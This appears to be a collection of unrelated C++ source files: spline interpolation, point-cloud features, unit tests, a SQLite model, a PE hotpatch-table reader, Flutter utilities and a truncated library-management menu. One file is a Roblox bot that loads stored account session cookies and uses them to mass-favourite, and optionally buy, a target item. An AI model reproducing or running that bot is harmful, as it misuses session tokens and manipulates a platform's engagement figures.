    "//\n// CubicSpline.cc\n// CubicSplineLib/\n//\n// Source file for the \"CubicSpline\" class. This object facilitates natural\n// cubic spline interpolation. Once instantiated the\n// constructor builds the spline polynomials on the intervals of the (x, y)\n// data provided and retains them for later invocation. Parallelized using\n// OpenMP.\n//\n// Copyright (C) Geoffrey Lentner 2015. All rights reserved.\n// See LICENCE file. (GPL v2.0) \n//\n// contact: Geoffrey Lentner, B.S.\n//          Graduate Student / Researcher\n//          102 Natural Science Building\n//          Department of Physics & Astronomy\n//          University of Louisville\n//          Louisville, KY 40292 USA\n//\n// email:   geoffrey.lentner@louisville.edu\n//\n// updated: 2015-1-19 13:10:30 EST\n//\n\n#include <iostream>\n#include <cmath>\n#include <vector>\n#include <algorithm>\n#include <exception>\n// #include <omp.h>\n\n#include <plan_manage/CubicSpline.h>\n\n// primary constructor\ntemplate<class T>\nCubicSpline<T>::CubicSpline( const std::vector<T>& _x_, const std::vector<T>& _y_,\n    int parallel, bool sorted ){\n\n    // check for valid input arguments\n    if ( _x_.size( ) < 4 || _y_.size( ) < 4 )\n        throw SplineError(\"[_x_.size( ) < 4 || _y_.size( ) < 4]\");\n    \n    if ( _x_.size( ) != _y_.size( ) )\n        throw SplineError(\"[_x_.size( ) != _y_.size( )]\");\n    \n    if ( parallel < 1 )\n        throw SplineError(\"[parallel < 1]\");\n    \n    // if ( parallel > omp_get_max_threads( ) )\n    //     throw SplineError(\"[parallel > omp_get_max_threads()]\");\n    \n    // // set parallelism\n    // omp_set_num_threads( parallel );\n    \n\t// last element in array has index 'n'\n\tn = _x_.size( ) - 1;\n   \n\t// local copy of the vectors\n    x = _x_;\n    y = _y_;\n    \n    // if not suppressed, ensure 'x' elements are in ascending order\n    if ( !sorted ) quicksort( );\n    \n    // build the spline polynomials on the intervals\n    build_splines( );\n}\n\n// copy constructor\ntemplate<class T>\nCubicSpline<T>::CubicSpline( const CubicSpline<T>& aCubicSpline ){\n\n    // copy over data\n    n = aCubicSpline.n;\n    x = aCubicSpline.x;\n    y = aCubicSpline.y;\n    a = aCubicSpline.a;\n    b = aCubicSpline.b;\n    k = aCubicSpline.k;\n}\n\n// recursive quicksort on member vectors 'x' and 'y'\ntemplate<class T>\nvoid CubicSpline<T>::quicksort ( const long& left , const long& right ) {\n    \n\t// local values\n    long l = left, r = right;\n\n\t// assign the value of the pivot to the mid-point,\n\t// this is the best option for uniform distribution\n    T pivot = x[ ( left + right ) / 2 ];\n    \n    // partition the arrays\n    while ( l <= r ) {\n        \n        while ( x[l] < pivot ) l++;\n        while ( x[r] > pivot ) r--;\n        \n        if ( l <= r ) {\n            \n            std::iter_swap( x.begin( ) + l, x.begin( ) + r );\n            std::iter_swap( y.begin( ) + l, y.begin( ) + r );\n            \n            l++; r--;\n        }\n    }\n    \n    // recursively call quicksort while appropriate\n    if ( left < r     ) quicksort ( left , r     );\n    if (    l < right ) quicksort ( l    , right );\n}\n\n// meta quicksort with parallel threads on class member 'data'\ntemplate<class T>\nvoid CubicSpline<T>::quicksort( ) {\n    \n    if ( false ) {\n        \n        // code needs revision\n    \n    } else quicksort( 0, n );\n}\n\n// build natural cubic spline polynomials\ntemplate<class T>\nvoid CubicSpline<T>::build_splines( ){\n\n\t// coefficients for tridiagonal linear system\n    a.resize( n + 1 );\n    b.resize( n + 1 );\n    c.resize( n + 1 );\n    d.resize( n + 1 );\n    \n\t// optimize for re-occurring quantities\n\tT diffx1, diffx2, diffy1, diffy2;\n\n\tdiffx1 = x[1] - x[0];\n\tdiffy1 = y[1] - y[0];\n\n\t// first values\n\ta[0] = 0.0;\n\tc[0] = 1.0 / diffx1;\n\tb[0] = 2.0 * c[0];\n\td[0] = 3.0 * diffy1 / ( diffx1 * diffx1 );\n\n\t// solve for coefficients of linear system\n\t#pragma omp parallel for\n\tfor ( long i = 1; i < n; i++ ){\n\n\t\tdiffx1 = x[i  ] - x[i-1];\n\t\tdiffx2 = x[i+1] - x[i  ];\n\t\tdiffy1 = y[i  ] - y[i-1];\n\t\tdiffy2 = y[i+1] - y[i  ];\n\n\t\ta[i] = 1.0 / diffx1;\n\t\tc[i] = 1.0 / diffx2;\n\t\tb[i] = 2.0 * (a[i] + c[i]);\n\t\td[i] = 3.0 * ( diffy1 / ( diffx1 * diffx1 ) + diffy2 /\n                      ( diffx2 * diffx2 ) );\n\t}\n\n\t// set last remaining values\n\tdiffx2 = x[n] - x[n-1];\n\tdiffy2 = y[n] - y[n-1];\n\n\ta[n] = 1.0 / diffx2;\n\tb[n] = 2.0 * a[n];\n\tc[n] = 0.0;\n\td[n] = 3.0 * diffy2 / ( diffx2 * diffx2 );\n\n\t// transform coefficients for the \"Thomas algorithm\"\n    c_prime.resize( n );\n    d_prime.resize( n + 1 );\n    \n\tc_prime[0] = c[0] / b[0];\n\td_prime[0] = d[0] / b[0];\n\n\tfor ( long i = 1; i < n; i++ ) {\n\t\n\t\tc_prime[i] = c[i] / ( b[i] - a[i] * c_prime[i-1] );\n\t\td_prime[i] = (d[i] - a[i] * d_prime[i-1]) / (b[i] - a[i] * c_prime[i-1]); \n\t}\n\n\t// last one\n\td_prime[n] = (d[n] - a[n] * d_prime[n-1]) / (b[n] - a[n] * c_prime[n-1]);\n\n\t// solve the linear system for the derivative of the splines\n    k.resize( n + 1 );\n\n\t// the last one first\n\tk[n] = d_prime[n];\n\n\t// the remaining are solved via back substitution\n\tfor ( long i = n - 1; i >= 0; i-- )\n\t\tk[i] = d_prime[",
    "//./moment_of_inertia lamppost.pcd\n//https://pcl.readthedocs.io/projects/tutorials/en/master/moment_of_inertia.html#moment-of-inertia\n#include <vector>\n#include <thread>\n\n#include <pcl/features/moment_of_inertia_estimation.h>\n#include <pcl/io/pcd_io.h>\n#include <pcl/point_types.h>\n#include <pcl/visualization/cloud_viewer.h>\n\nusing namespace std::chrono_literals;\n\nint main (int argc, char** argv)\n{\n  if (argc != 2)\n    return (0);\n\n  pcl::PointCloud<pcl::PointXYZ>::Ptr cloud (new pcl::PointCloud<pcl::PointXYZ> ());\n  if (pcl::io::loadPCDFile (argv[1], *cloud) == -1)\n    return (-1);\n\n  pcl::MomentOfInertiaEstimation <pcl::PointXYZ> feature_extractor;\n  feature_extractor.setInputCloud (cloud);\n  feature_extractor.compute ();\n\n  std::vector <float> moment_of_inertia;\n  std::vector <float> eccentricity;\n  pcl::PointXYZ min_point_AABB;\n  pcl::PointXYZ max_point_AABB;\n  pcl::PointXYZ min_point_OBB;\n  pcl::PointXYZ max_point_OBB;\n  pcl::PointXYZ position_OBB;\n  Eigen::Matrix3f rotational_matrix_OBB;\n  float major_value, middle_value, minor_value;\n  Eigen::Vector3f major_vector, middle_vector, minor_vector;\n  Eigen::Vector3f mass_center;\n\n  feature_extractor.getMomentOfInertia (moment_of_inertia);\n  feature_extractor.getEccentricity (eccentricity);\n  feature_extractor.getAABB (min_point_AABB, max_point_AABB);\n  feature_extractor.getOBB (min_point_OBB, max_point_OBB, position_OBB, rotational_matrix_OBB);\n  feature_extractor.getEigenValues (major_value, middle_value, minor_value);\n  feature_extractor.getEigenVectors (major_vector, middle_vector, minor_vector);\n  feature_extractor.getMassCenter (mass_center);\n\n  pcl::visualization::PCLVisualizer::Ptr viewer (new pcl::visualization::PCLVisualizer (\"3D Viewer\"));\n  viewer->setBackgroundColor (0, 0, 0);\n  viewer->addCoordinateSystem (1.0);\n  viewer->initCameraParameters ();\n  viewer->addPointCloud<pcl::PointXYZ> (cloud, \"sample cloud\");\n  viewer->addCube (min_point_AABB.x, max_point_AABB.x, min_point_AABB.y, max_point_AABB.y, min_point_AABB.z, max_point_AABB.z, 1.0, 1.0, 0.0, \"AABB\");\n  viewer->setShapeRenderingProperties(pcl::visualization::PCL_VISUALIZER_REPRESENTATION, pcl::visualization::PCL_VISUALIZER_REPRESENTATION_WIREFRAME, \"AABB\");\n\n  Eigen::Vector3f position (position_OBB.x, position_OBB.y, position_OBB.z);\n  Eigen::Quaternionf quat (rotational_matrix_OBB);\n  viewer->addCube (position, quat, max_point_OBB.x - min_point_OBB.x, max_point_OBB.y - min_point_OBB.y, max_point_OBB.z - min_point_OBB.z, \"OBB\");\n  viewer->setShapeRenderingProperties(pcl::visualization::PCL_VISUALIZER_REPRESENTATION, pcl::visualization::PCL_VISUALIZER_REPRESENTATION_WIREFRAME, \"OBB\");\n\n  pcl::PointXYZ center (mass_center (0), mass_center (1), mass_center (2));\n  pcl::PointXYZ x_axis (major_vector (0) + mass_center (0), major_vector (1) + mass_center (1), major_vector (2) + mass_center (2));\n  pcl::PointXYZ y_axis (middle_vector (0) + mass_center (0), middle_vector (1) + mass_center (1), middle_vector (2) + mass_center (2));\n  pcl::PointXYZ z_axis (minor_vector (0) + mass_center (0), minor_vector (1) + mass_center (1), minor_vector (2) + mass_center (2));\n  viewer->addLine (center, x_axis, 1.0f, 0.0f, 0.0f, \"major eigen vector\");\n  viewer->addLine (center, y_axis, 0.0f, 1.0f, 0.0f, \"middle eigen vector\");\n  viewer->addLine (center, z_axis, 0.0f, 0.0f, 1.0f, \"minor eigen vector\");\n\n  while(!viewer->wasStopped())\n  {\n    viewer->spinOnce (100);\n    std::this_thread::sleep_for(100ms);\n  }\n\n  return (0);\n}",
    "//\n//    FILE: unit_test_001.cpp\n//  AUTHOR: Rob Tillaart\n//    DATE: 2023-06-28\n// PURPOSE: unit tests for Smooth library\n//          https://github.com/RobTillaart/SIMON\n//\n\n\n// supported assertions\n// ----------------------------\n// assertEqual(expected, actual);               // a == b\n// assertNotEqual(unwanted, actual);            // a != b\n// assertComparativeEquivalent(expected, actual);    // abs(a - b) == 0 or (!(a > b) && !(a < b))\n// assertComparativeNotEquivalent(unwanted, actual); // abs(a - b) > 0  or ((a > b) || (a < b))\n// assertLess(upperBound, actual);              // a < b\n// assertMore(lowerBound, actual);              // a > b\n// assertLessOrEqual(upperBound, actual);       // a <= b\n// assertMoreOrEqual(lowerBound, actual);       // a >= b\n// assertTrue(actual);\n// assertFalse(actual);\n// assertNull(actual);\n\n// // special cases for floats\n// assertEqualFloat(expected, actual, epsilon);    // fabs(a - b) <= epsilon\n// assertNotEqualFloat(unwanted, actual, epsilon); // fabs(a - b) >= epsilon\n// assertInfinity(actual);                         // isinf(a)\n// assertNotInfinity(actual);                      // !isinf(a)\n// assertNAN(arg);                                 // isnan(a)\n// assertNotNAN(arg);                              // !isnan(a)\n\n\n#include <ArduinoUnitTests.h>\n\n#include \"Arduino.h\"\n#include \"SmartPin.h\"\n\n\nunittest_setup()\n{\n  fprintf(stderr, \"Arduino SmartPin library\\n\");\n}\n\n\nunittest_teardown()\n{\n}\n\n\nunittest(test_constructor)\n{\n  // assertEqual(42, sm.get_window());\n  // assertEqual(0, sm.get_count());\n  // assertEqualFloat(0, sm.get_avg(), 0.0001);\n\n  // Smooth sm0(5, 0, 0);\n  // assertEqual(5, sm0.get_window());\n  // assertEqual(0, sm0.get_count());\n  // assertEqualFloat(0, sm0.get_avg(), 0.0001);\n\n  // Smooth sm1(7, 20);\n  // assertEqual(7, sm1.get_window());\n  // assertEqual(20, sm1.get_count());\n  // assertEqualFloat(0, sm0.get_avg(), 0.0001);\n\n  // Smooth sm2(15, 25, 10);\n  // assertEqual(15, sm2.get_window());\n  // assertEqual(25, sm2.get_count());\n  // assertEqualFloat(10, sm2.get_avg(), 0.0001);\n}\n\n\nunittest_main()\n\n\n//  -- END OF FILE --\n\n",
    "#include <iostream>\n#include <cstring>\n#include <sstream>\n#include <fstream>\n#include <cpr/cpr.h>\n#include <nlohmann/json.hpp>\n#include <regex>\n\n// -- INFOS -- //\n\nstd::string RobloxUrl = \"https://www.roblox.com\";\nlong long int TargetFavoriteItem = 15556784020; // Change this with your target item's asset id (Works with games aswell but you can purchase games)\nbool IsBuyingEnabled = false; // Set it to true if you want accounts to buy it (Dont use this if the target is a game)\nlong long int TargetFavoriteItemProduct = 22; // Product id of target item\nint TargetItemPrice = 0; // Price of target item\n\n// -- Functions and Main -- //\n\nnlohmann::json ToJson(std::string JsonSource) {\n    return nlohmann::json::parse(JsonSource.c_str());\n}\n\nstd::string GetAccounts() {\n    std::ifstream file(\"Accounts.txt\");\n\n    if (!file.is_open()) {\n        std::cout << \"Error opening file\" << std::endl;\n        return \"\";\n    }\n    std::string fileContents((std::istreambuf_iterator<char>(file)),\n                            std::istreambuf_iterator<char>());\n    file.close();\n    return fileContents;\n}\n\nvoid FavTarget(long long int TargetID) {\n    std::string AccountTXT = GetAccounts();\n    std::regex pattern(\"Username: (.+)\\nCookie: (.+)\");\n    std::sregex_iterator iter(AccountTXT.begin(), AccountTXT.end(), pattern);\n    std::sregex_iterator end;\n\n    while (iter != end) {\n        std::smatch match = *iter;\n        std::string MyUser = match[1];\n        std::string Cookie = match[2];\n\n        //std::cout << Cookie << std::endl;\n\n        cpr::Session newsession;\n        newsession.SetHeader(cpr::Header{{\"Content-Type\", \"application/json\"}});\n        newsession.SetCookies(cpr::Cookies{{\".ROBLOSECURITY\", Cookie.c_str()}});\n        newsession.SetUrl(cpr::Url(\"https://auth.roblox.com/v2/logout\"));\n\n        cpr::Response resp = newsession.Post();\n\n        auto it = resp.header.find(\"x-csrf-token\");\n        if (it != resp.header.end()) {\n            newsession.UpdateHeader(cpr::Header({{\"referer\", RobloxUrl.c_str()}, {\"x-csrf-token\", it->second}}));\n        }\n\n        nlohmann::json BodyGetUserid;\n        BodyGetUserid[\"usernames\"] = {MyUser.c_str()};\n        BodyGetUserid[\"excludeBannedUsers\"] = true;\n\n        newsession.SetBody(cpr::Body(BodyGetUserid.dump()));\n        newsession.SetUrl(cpr::Url(\"https://users.roblox.com/v1/usernames/users\"));\n        \n        cpr::Response UseridResponse = newsession.Post();\n        nlohmann::json UseridJson = ToJson(UseridResponse.text);\n        long long int MyUserId = UseridJson[\"data\"][0][\"id\"];\n\n        if (IsBuyingEnabled) {\n            // Purchase the target thing\n            std::string BuyUrl = \"https://apis.roblox.com/creator-marketplace-purchasing-service/v1/products/\" + std::to_string(TargetID) + \"/purchase\";\n            nlohmann::json BuyBody;\n            BuyBody[\"expectedPrice\"] = TargetItemPrice;\n            BuyBody[\"expectedSellerId\"] = 1;\n            BuyBody[\"expectedCurrency\"] = 1;\n\n            newsession.SetUrl(cpr::Url(BuyUrl.c_str()));\n            newsession.SetBody(cpr::Body(BuyBody.dump()));\n            newsession.Post();\n        }\n\n\n        // Favorite it\n        newsession.SetBody(cpr::Body()); // Set body to nothing\n\n        std::string TargetUrl = \"https://catalog.roblox.com/v1/favorites/users/\" + std::to_string(MyUserId) + \"/assets/\" + std::to_string(TargetID) + \"/favorite\";\n        newsession.SetUrl(cpr::Url(TargetUrl.c_str()));\n\n        cpr::Response FavResponse = newsession.Post();\n\n        std::cout << FavResponse.status_code << std::endl;\n\n        iter++;\n\n        Sleep(1500); // 1.5 sec\n    }\n}\n\nint main(int, char**){\n    FavTarget(TargetFavoriteItem);\n}\n",
    "#include \"learn/assignment_submission.h\"\n#include \"auth/student.h\"\n#include \"utils/exceptions.h\"\n\n#include <iostream>\n\nnamespace learn {\n\nassignment_submission::assignment_submission (std::string id)\n: db::database_item (id) {\n    get ();\n}\nassignment_submission::assignment_submission (std::string assignment, std::string student, double grade)\n: _assignment{ assignment }, _student (student), _grade (grade) {\n}\nassignment_submission::assignment_submission (std::string assignment, std::string student)\n: _assignment (assignment), _student (student), _grade{ -1 } {\n    _submission_datetime = time (NULL);\n}\n\ndouble assignment_submission::get_grade () const {\n    if (!is_graded ())\n        throw utils::custom_exception{ \"Assignment not graded\" };\n    return _grade;\n}\n\n// assignment assignment_submission::get_assignment () {\n//     return assignment (_assignment);\n// }\n\n// auth::student assignment_submission::get_student () {\n//     return auth::student (_student);\n// }\n\n\nbool assignment_submission::set_grade (double new_grade) {\n    if (db::database::get_instance ().update_item (\n        *this, { { \"grade\", std::to_string (new_grade) } })) {\n        _grade = new_grade;\n        return true;\n    }\n    return false;\n}\nvoid assignment_submission ::get () {\n    if (!saved_in_db ())\n        throw utils::custom_exception{ \"Item not saved in database;\" };\n\n    std::string query_string =\n    \"select * from assignmentsubmissions where id = ?\";\n\n    SQLite::Statement query (db::database::get_db (), query_string);\n    query.bind (1, _id);\n\n    while (query.executeStep ()) {\n        _grade               = query.getColumn (1);\n        _submission_datetime = query.getColumn (2);\n        _assignment          = (std::string)query.getColumn (3);\n        _student             = (std::string)query.getColumn (4);\n\n#if PRINT_DATA_WHEN_RETRIEVED\n        std::cout << \"Assignment ID: \" << _assignment << \"\\nSubmission ID: \" << _id\n                  << \"\\nGrade: \" << _grade << \"\\nStudent ID: \" << _student << std::endl\n                  << \"Submission Date: \" << _submission_datetime << std::endl\n                  << std::endl;\n#endif\n    }\n}\n\nbool assignment_submission::add_to_database (SQLite::Database& db) {\n    SQLite::Statement query (db,\n    \"INSERT INTO AssignmentSubmissions(grade, assignment_id, student_id) \"\n    \"VALUES(?,?,?) RETURNING id, submission_date\");\n\n    query.bind (1, _grade);\n    query.bindNoCopy (2, _assignment);\n    query.bindNoCopy (3, _student);\n\n    query.executeStep ();\n\n    int assignment_submission_id   = query.getColumn (0);\n    int assignment_submission_date = query.getColumn (1);\n\n    _id                  = std::to_string (assignment_submission_id);\n    _submission_datetime = assignment_submission_date;\n    return (stoi (_id) != 0);\n}\n\nbool assignment_submission::remove_from_database (SQLite::Database& db) {\n    SQLite::Statement query (db, \"DELETE FROM AssignmentSubmissions WHERE id = ?\");\n\n    query.bindNoCopy (1, _id);\n\n    int success = query.exec ();\n    return success;\n}\nbool assignment_submission::update_in_database (SQLite::Database& db,\nstd::map<std::string, std::any> props) {\n    std::string query_string = \"UPDATE AssignmentSubmissions SET \";\n    int count                = 0;\n    for (auto const& [key, val] : props) {\n        if (count > 0)\n            query_string += \",\";\n\n        query_string += key + \" = \";\n\n        if (key == \"grade\")\n            query_string += std::to_string (std::any_cast<double> (val));\n        else\n            query_string += std::to_string (std::any_cast<int> (val));\n\n        count++;\n    }\n\n    query_string += \" WHERE id = ?\";\n\n    SQLite::Statement query (db, query_string);\n    query.bindNoCopy (1, _id);\n\n    int success = query.exec ();\n    return success;\n}\n} // namespace learn\n",
    "#define  _CRT_SECURE_NO_WARNINGS\r\n\r\n#include <Windows.h>\r\n#include <imagehlp.h>\r\n#include <stdio.h>\r\nBOOL our_GetImageConfigInformation(\r\n\tPLOADED_IMAGE                LoadedImage,\r\n\tPIMAGE_LOAD_CONFIG_DIRECTORY ImageConfigInformation\r\n)\r\n{\r\n\tif (!LoadedImage || !ImageConfigInformation)\r\n\t{\r\n\t\tSetLastError(ERROR_INVALID_PARAMETER);\r\n\t\treturn FALSE;\r\n\t}\r\n\tif (LoadedImage->FileHeader->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR_MAGIC)\r\n\t{\r\n\t\tSetLastError(ERROR_INVALID_PARAMETER);\r\n\t\treturn FALSE;\r\n\t}\r\n\tULONG LoadConfigDirectorySize;\r\n\tPIMAGE_LOAD_CONFIG_DIRECTORY LoadConfigDirectoryAddress\r\n\t\t= (PIMAGE_LOAD_CONFIG_DIRECTORY)ImageDirectoryEntryToDataEx(\r\n\t\t\tLoadedImage->MappedAddress,\r\n\t\t\tFALSE,\r\n\t\t\tIMAGE_DIRECTORY_ENTRY_LOAD_CONFIG,\r\n\t\t\t&LoadConfigDirectorySize,\r\n\t\t\tNULL\r\n\t\t);\r\n\tif (!LoadConfigDirectoryAddress)\r\n\t{\r\n\t\tSetLastError(ERROR_INVALID_DATA);\r\n\t\treturn FALSE;\r\n\t}\r\n\tif (LoadConfigDirectorySize != sizeof(IMAGE_LOAD_CONFIG_DIRECTORY))\r\n\t{\r\n\t\tSetLastError(ERROR_INVALID_DATA);\r\n\t\treturn FALSE;\r\n\t}\r\n\tif (LoadConfigDirectoryAddress->Size > 0 && LoadConfigDirectoryAddress->Size < sizeof(IMAGE_LOAD_CONFIG_DIRECTORY))\r\n\t{\r\n\t\tSetLastError(ERROR_INVALID_DATA);\r\n\t\treturn FALSE;\r\n\t}\r\n\tsize_t hotpatch_offset = 0;\r\n\thotpatch_offset = (size_t)&LoadConfigDirectoryAddress->HotPatchTableOffset - (size_t)LoadedImage->MappedAddress;\r\n\tprintf(\"Hotpatch File Offset: %d\\n\", hotpatch_offset);\r\n\r\n\tmemcpy(ImageConfigInformation, LoadConfigDirectoryAddress, sizeof(IMAGE_LOAD_CONFIG_DIRECTORY));\r\n\treturn TRUE;\r\n}\r\nsize_t determine_patch_table_offset(PLOADED_IMAGE img, PIMAGE_LOAD_CONFIG_DIRECTORY dic) {\r\n\tfor (int i = 0; i < img->NumberOfSections; i++) {\r\n\t\tif (dic->HotPatchTableOffset > img->Sections[i].VirtualAddress && dic->HotPatchTableOffset < (img->Sections[i].VirtualAddress + img->Sections[i].SizeOfRawData)) {\r\n\r\n\t\t\tsize_t result =  img->Sections[i].PointerToRawData + (dic->HotPatchTableOffset - img->Sections[i].VirtualAddress);\r\n\t\t\treturn result;\r\n\t\t}\r\n\r\n\t}\r\n\treturn 0;\r\n}\r\nint main() {\r\n\t//const char* img_path = \"C:\\\\NtHotpatch\\\\dist\\\\kernelbase_patch_mod.dll\";\r\n\tconst char* img_path = \"C:\\\\NtHotpatch\\\\dist\\\\UpdatedDLL.dll\";\r\n\tPLOADED_IMAGE img;\r\n\r\n\tIMAGE_LOAD_CONFIG_DIRECTORY dic;\r\n\tZeroMemory(&dic, sizeof(dic));\r\n\tdic.Size = sizeof(dic);\r\n\r\n#if 1\r\n\tstatic LOADED_IMAGE ref_img;\r\n\tif (!MapAndLoad(img_path, NULL, &ref_img, TRUE, TRUE)) {\r\n\t\tprintf(\"failed to map and load img - %08x\\n\", GetLastError());\r\n\t\treturn 0;\r\n\t}\r\n\telse {\r\n\t\timg = &ref_img;\r\n\t}\r\n#else\r\n\timg = ImageLoad(img_path, NULL);\r\n\tif (!img) {\r\n\t\tprintf(\"failed to load img - %08x\\n\", GetLastError());\r\n\t\treturn 0;\r\n\t}\r\n#endif\r\n\r\n\tif (!our_GetImageConfigInformation(img, &dic)) {\r\n\t\tprintf(\"Failed to get img config info - %08x\\n\", GetLastError());\r\n\t} \r\n\telse {\r\n\t\tprintf(\"Hotpatch: %d\\n\", dic.HotPatchTableOffset);\r\n\t\t/*if (!ImageUnload(img)) {\r\n\t\t\tprintf(\"Failed to unload img\\n\");\r\n\t\t\treturn 0;\r\n\t\t}*/\r\n\t\tFILE* fd = fopen(img_path, \"rb\");\r\n\r\n\t\tint patch_info_offset = determine_patch_table_offset(img, &dic);\r\n\t\tfseek(fd, patch_info_offset, SEEK_SET);\r\n\r\n\t\tIMAGE_HOT_PATCH_INFO info;\r\n\t\tZeroMemory(&info, sizeof(info));\r\n\t\tfread(&info, sizeof(IMAGE_HOT_PATCH_INFO), 1, fd);\r\n\t\t\r\n\t\tprintf(\"IMAGE_HOT_PATCH_INFO - size %d: \\n\", sizeof(IMAGE_HOT_PATCH_INFO));\r\n\t\tprintf(\"\\tVersion: %d\\n\", info.Version);\r\n\t\tprintf(\"\\tSize: %d\\n\", info.Size);\r\n\t\tprintf(\"\\tSequenceNumber: %d\\n\", info.SequenceNumber);\r\n\t\tprintf(\"\\tBaseImageList: %d\\n\", info.BaseImageList);\r\n\t\tprintf(\"\\tBaseImageCount: %d\\n\", info.BaseImageCount);\r\n\t\tif (info.Version >= 2) {\r\n\t\t\tprintf(\"\\tBufferOffset: %d\\n\", info.BufferOffset);\r\n\t\t\tif (info.Version >= 3) {\r\n\t\t\t\tprintf(\"\\tExtraPatchSize: %d\\n\", info.ExtraPatchSize);\r\n\t\t\t}\r\n\t\t}\r\n\t\telse {\r\n\t\t\tprintf(\"unsupported patch info version\\n\");\r\n\t\t\treturn 0;\r\n\t\t}\r\n\r\n\t\tfseek(fd, patch_info_offset + info.BaseImageList, SEEK_SET);\r\n\t\twhile ((ftell(fd) & 4)) { //force 32 bit alignment\r\n\t\t\tuint8_t x;\r\n\t\t\tfread(&x, 1, 1, fd);\r\n\t\t\tprintf(\"align... %02x\\n\", x);\r\n\t\t\t\r\n\t\t}\r\n\t\tfor (int i = 0; i < info.BaseImageCount; i++) {\r\n\t\t\tIMAGE_HOT_PATCH_BASE base;\r\n\t\t\tfread(&base, sizeof(IMAGE_HOT_PATCH_BASE), 1, fd);\r\n\t\t\tprintf(\"IMAGE_HOT_PATCH_BASE - size: %d\\n\", sizeof(IMAGE_HOT_PATCH_BASE));\r\n\t\t\tprintf(\"\\tSequenceNumber: %d\\n\", base.SequenceNumber);\r\n\t\t\tprintf(\"\\tFlags: %d\\n\", base.Flags);\r\n\t\t\tprintf(\"\\tOriginalTimeDateStamp: %d\\n\", base.OriginalTimeDateStamp);\r\n\t\t\tprintf(\"\\tOriginalCheckSum: %d\\n\", base.OriginalCheckSum);\r\n\t\t\tprintf(\"\\tCodeIntegrityInfo: %d\\n\", base.CodeIntegrityInfo);\r\n\t\t\tprintf(\"\\tCodeIntegritySize: %d\\n\", base.CodeIntegritySize);\r\n\t\t\tprintf(\"\\tPatchTable: %d\\n\", base.PatchTable);\r\n\t\t\tprintf(\"\\tBufferOffset: %d\\n\", base.BufferOffset);\r\n\t\t\tbreak;\r\n\t\t}\r\n\r\n\t\t\r\n\r\n\t\tfclose(fd);\r\n\t}\r\n\r\n\treturn 0;\r\n}",
    "#include \"globals.h\"\n\n// globals\nstring file;\nstring dirClient;\nstring user;\nstring command;\nstring hostIp;\nstring port;\n\nbool parse_args(int argc, char *argv[]) {\n    po::options_description desc(\"Allowed options\");\n\n    desc.add_options()\n            (\"help,h\", \"print usage message\")\n            (\"ip, ip\", po::value(&hostIp), \"IP addres\")\n            (\"port,p\", po::value(&port), \"port\")\n            (\"dir,d\", po::value(&dirClient), \"the path to the folder where the files are saved\")\n            (\"command,c\", po::value(&command), \"command\")\n            (\"username,u\", po::value(&user),\"username\")\n            (\"file,f\", po::value(&file), \"file\");\n\n    // Parse argc and argv\n    po::variables_map vm;\n    store(po::parse_command_line(argc, argv, desc), vm);\n\n    if (vm.count(\"help\")) {\n        cout << desc << endl;\n        return false;\n    }\n\n    if (!vm.count(\"port\")) {\n        cout << desc << endl;\n        return false;\n    }\n    port = vm[\"port\"].as<string>();\n\n\n    user = vm[\"username\"].as<string>();\n    if (!vm.count(\"username\")) {\n        cout << desc << endl;\n        return false;\n    }\n\n    command = vm[\"command\"].as<string>();\n    if (!vm.count(\"command\")) {\n        cout << desc << endl;\n        return false;\n    }\n\n    file = vm[\"file\"].as<string>();\n    if (!vm.count(\"file\")) {\n        cout << desc << endl;\n        return false;\n    }\n\n    dirClient= vm[\"dir\"].as<string>();\n    if (!vm.count(\"dir\")) {\n        cout << desc << endl;\n        return false;\n    }\n\n    hostIp = vm[\"ip\"].as<string>();\n    if (!vm.count(\"ip\")) {\n        cout << desc << endl;\n        return false;\n    }\n\n    return true;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\n#include <fstream>\n#include <string>\n#include <vector>\n#include <algorithm>\n#include \"easylib.h\"\n\nusing namespace std;\n\nint main() {\n    Library library;\n    library.loadBooksFromFile(); // Load book data on startup\n    library.loadMembersFromFile(); // Load member data on startup\n\n    int choice;\n    do {\n// cout <<\"  _____                         _       _   _      \" << endl; \n// cout <<\" | ____|   __ _   ___   _   _  | |     (_) | |__   \" << endl;\n// cout <<\" |  _|    / _` | / __| | | | | | |     | | | '_ \\  \" << endl; \n// cout <<\" | |___  | (_| | \\__ \\ | |_| | | |___  | | | |_) | \" << endl; \n// cout <<\" |_____|  \\__,_| |___/  \\__, | |_____| |_| |_.__/  \" << endl;  \n// cout <<\"                       |___/                       \" << endl; \n        cout << \"\\nEasyLib - A Library Management System\" << endl;\n        cout << \"1. Add Book\" << endl;\n        cout << \"2. Issue Book\" << endl;\n        cout << \"3. Return Book\" << endl;\n        cout << \"4. Search Books\" << endl;\n        cout << \"5. Display All Books\" << endl;\n        cout << \"6. Add 